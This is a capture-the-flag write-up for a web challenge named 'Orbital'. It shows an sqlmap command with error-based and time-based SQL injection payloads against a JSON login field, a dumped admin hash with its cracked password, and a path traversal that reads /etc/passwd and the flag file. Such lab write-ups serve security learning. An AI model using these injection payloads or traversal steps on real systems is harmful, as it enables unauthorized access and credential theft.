@@ -1,0 +1,73 @@
+<h2>Orbital</h2>
+
+<blockquote>
+  <p>Solved by Legend</p>
+</blockquote>
+
+<p>Challenge description</p>
+
+<blockquote>
+  <p>In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?</p>
+</blockquote>
+
+<p>In this challenge also a login page is their.</p>
+
+<p><img src="https://i.imgur.com/ak8NBt8.png" alt="" /></p>
+
+<p>And with no user info or details in source code I checked the docker files.</p>
+
+<p>This challenge is similar to the <code>Drobots</code> challenge. It’s running <code>Flask</code> application with <code>MySQL</code>. So I looked into the docker file.</p>
+
+<p>The <code>config.py</code> contains the database config info.</p>
+
+<p><img src="https://i.imgur.com/taRJF8c.png" alt="" /></p>
+
+<p>And <code>database.py</code> contain the database logic along with the hint but it is modified a little.
+This time the <code>password</code> is getting verified with <code>passwordVerify</code>.</p>
+
+<p><img src="https://i.imgur.com/B5AErEg.png" alt="" /></p>
+
+<p>I again saved the request and gave it to <code>sqlmap</code>  which gave me the token and also bruteforced the password.</p>
+
+<pre><code>sqlmap -r ./req --dbms=mysql -D orbital -T users --dump
+
+
+---
+Parameter: JSON username ((custom) POST)
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: {"username":"a"="a" AND (SELECT 2720 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(2720=2720,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "a"="a","password":"a"}
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: {"username":"a"="a" AND (SELECT 1000 FROM (SELECT(SLEEP(5)))dfxy) AND "a"="a","password":"a"}
+---
+
+
++----+-------------------------------------------------+----------+
+| id | password                                        | username |
++----+-------------------------------------------------+----------+
+| 1  | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin    |
++----+-------------------------------------------------+----------+
+</code></pre>
+
+<p>Now once logged in the functionality of the website was different.</p>
+
+<p><img src="https://i.imgur.com/tDoI12L.png" alt="" /></p>
+
+<p>Now I checked the <code>routes.py</code> file which contained a logic of the application. Here in the logic of communication the hint was given that the file escape for characters are not there for the filename. </p>
+
+<p><img src="https://i.imgur.com/zFxOjWB.png" alt="" /></p>
+
+<p>Then I tried the path traversal to get the <code>/etc/passwd</code> file. It worked. </p>
+
+<p><img src="https://i.imgur.com/yh8DtGq.png" alt="" /></p>
+
+<p>For this challenge they changed the location of the flag name from <code>flag.txt</code> to <code>signal_sleuth_firmware</code> in root which is written in the docker config.</p>
+
+<pre><code>COPY flag.txt /signal_sleuth_firmware
+</code></pre>
+
+<p>Now we need to get the flag.</p>
+
+<p><img src="https://i.imgur.com/BFlcwv3.png" alt="" /></p>
